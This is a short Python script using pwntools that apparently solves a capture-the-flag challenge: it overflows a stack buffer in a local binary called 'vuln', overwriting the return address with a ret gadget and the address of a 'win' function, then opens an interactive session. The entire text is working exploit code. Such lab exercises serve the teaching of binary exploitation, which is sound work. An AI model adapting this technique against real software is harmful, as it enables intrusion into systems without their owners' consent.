from pwn import *

elf = context.binary = ELF("./vuln")

if args.REMOTE:
    io = remote("localhost", 13337)
else:
    io = process()

offset = 0x70 + 0x8
ret = 0x401016
payload = b"\x00" * offset + p64(ret) + p64(elf.symbols["win"])

io.sendline(payload)
io.interactive()
